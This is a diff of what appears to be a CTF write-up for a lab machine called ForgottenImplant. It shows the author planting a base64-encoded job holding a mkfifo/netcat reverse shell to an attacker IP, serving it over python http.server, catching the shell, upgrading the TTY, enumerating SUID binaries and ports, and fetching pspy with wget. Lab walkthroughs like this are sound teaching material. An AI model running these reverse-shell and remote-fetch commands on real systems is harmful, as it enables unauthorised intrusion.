@@ -69,41 +69,114 @@ Connection: keep-alive
 <br>
 
 ```bash
-:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+:~/ForgottenImplant# python3 -m http.server 81
+Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDktMDlUMDE6NDE6MDIuMDc0ODI5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03Mi0xMTYifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 
 ```
+
+<img width="1355" height="292" alt="image" src="https://github.com/user-attachments/assets/4e1170fc-3d69-45a7-8ec0-24eeceea67aa" />
+
+<br>
+<br>
+<h2>CyberChef</h2>
+
+```bash
+{"time": "2025-09-08Txx:xx:xx.xxxxxx9", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xxx6"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
+```
+
+<img width="1354" height="266" alt="image" src="https://github.com/user-attachments/assets/9f0df0b1-7eed-41c1-88f0-8b5b6b8b5efe" />
 
 <br>
 <br>
 
 ```bash
-:~/ForgottenImplant# echo 'eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0=' | base64 -d
-{"time": "2025-xx-xxTxx:xx:xx1.xxxxxx", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xx"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
+"latest"
+```
+
+<img width="1359" height="170" alt="image" src="https://github.com/user-attachments/assets/23bbf18b-f500-47d3-8a39-da717b1eb078" />
+
+<br>
+<br>
+
+<h2>get-job</h2>
+
+```bash
+:~/ForgottenImplant# mkdir get-job
+```
+
+<h2>get-job</h2>
+
+```bash
+:~/ForgottenImplant# mkdir get-job
+```
+
+
+echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.201.9.74 1234 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+
+
+```bash
+:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+```
+
+<img width="1357" height="189" alt="image" src="https://github.com/user-attachments/assets/686026c4-9eb0-4321-a496-5dcbb09f6fab" />
+
+<br><br><br>
+
+
+```bash
+:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx 1234 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
 ```
 
 ```bash
 :~/ForgottenImplant# python3 -m http.server 81
-Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6MzI6MDIuMDA2MDMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
-```
-
-<br>
-<br>
-
-```bash
-:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
-```
-
-```bash
-:~/ForgottenImplant# python3 -m http.server 81
-Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 ...
-xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
+10.201.72.116 - - [09/Sep/2025 02:55:02] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
 ```
+
+```bash
+:~/ForgottenImplant# nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.201.72.116 42940
+bash: cannot set terminal process group (1336): Inappropriate ioctl for device
+bash: no job control in this shell
+ada@ip-10-201-72-116:~$ 
+```
+
+```bash
+ada@...:~$  python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+</bash')" || /usr/bin/script -qc /bin/bash /dev/null
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <br>
 <h2>ada</h2>
@@ -126,10 +199,22 @@ uid=1001(ada) gid=1001(ada) groups=1001(ada)
 ```
 
 ```bash
-ada@...:~$ ls
-ls
-products.py
-user.txt
+ada...:~$ ll
+ll
+total 44
+drwxr-xr-x 5 ada  ada  4096 Mar 13  2023 ./
+drwxr-xr-x 6 root root 4096 Sep  9 01:18 ../
+lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
+-rw-r--r-- 1 ada  ada  3771 Jul 10  2022 .bashrc
+drwx------ 3 ada  ada  4096 Jul 12  2022 .cache/
+drwxrwxr-x 2 ada  ada  4096 Sep  9 01:20 .implant/
+drwxrwxr-x 4 ada  ada  4096 Jul 12  2022 .local/
+-rw-rw-r-- 1 ada  ada   292 Jul 12  2022 products.py
+-rw-r--r-- 1 ada  ada   807 Jul 10  2022 .profile
+lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
+-rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
+-rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
 ```
 
 ```bash
@@ -139,38 +224,87 @@ THM{********************************}
 ```
 
 <br>
-<p>1.1. What is the root flag?</p>
+<p>1.1. What is the user flag?<br>
+<code>THM{********************************}</code></p>
 <br>
-<br>
+
+
+
+<h4>hosts</h4>
 
 ```bash
-ada@...:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-ada@...:~$ ^Z
-[1]+  Stopped                 nc -nlvp 4444
-:~# stty raw -echo && fg;
-nc -nlvp 4444
-
-ada@...:~$ export TERM=xterm
+ada@...:~$ getent hosts
+getent hosts
+127.0.0.1       localhost
+127.0.1.1       forgottenimplant
+127.0.0.1       ip6-localhost ip6-loopback
 ```
+
+
+<h4></h4>
 
 ```bash
-ada@...:~$ ls -lah
-total 44K
-drwxr-xr-x 5 ada  ada  4.0K Mar 13  2023 .
-drwxr-xr-x 6 root root 4.0K Sep 08  2025 ..
-lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
--rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
--rw-r--r-- 1 ada  ada  3.7K Jul 10  2022 .bashrc
-drwx------ 3 ada  ada  4.0K Jul 12  2022 .cache
-drwxrwxr-x 2 ada  ada  4.0K Aug 27 20:04 .implant
-drwxrwxr-x 4 ada  ada  4.0K Jul 12  2022 .local
--rw-rw-r-- 1 ada  ada   292 Jul 12  2022 products.py
--rw-r--r-- 1 ada  ada   807 Jul 10  2022 .profile
-lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
--rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
--rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
+ada@...:~$ ss -tulpn
+ss -tulpn
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
+udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
+udp   UNCONN 0      0      10.201.72.116%ens5:68           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      511             127.0.0.1:80           0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:*          
 ```
+
+
+<h2></h2>
+
+```bash
+ada@...:~$ find / -perm -4000 -user root -type f 2>/dev/null
+find / -perm -4000 -user root -type f 2>/dev/null
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+```
+
+<h2>pspy</h2>
+
+<p>
+
+- /usr/sbin/CRON -f<br>
+- /bin/sh -c python3 /home/ada/.implant/implant.p<br>
+- /python3 /home/ada/.implant/implant.py<br>
+- /usr/sbin/CRON -f
+
+</p>
+
+```bash
+ada@...:/tmp$ wget http://xx.xxx.x.xxx:8000/pspy64 -O /tmp/pspy64;chmod +x /tmp/pspy64;/tmp/pspy64
+```
+
+
+<img width="1356" height="792" alt="image" src="https://github.com/user-attachments/assets/eabf20cd-5f9b-4c52-9248-39170318dc94" />
+
+<br>
+
+<img width="1360" height="450" alt="image" src="https://github.com/user-attachments/assets/09bb04e1-3954-4ef8-8ce1-2cd647c015a0" />
+
+
+
+<h4></h4>
 
 <h4>products.py</h4>
 
@@ -202,6 +336,8 @@ for product in cursor.fetchall():
 <br>
 <br>
 <h2>mysql</h2>
+
+
 
 ```bash
 ada@...:/home$ mysql -h localhost -u app -p
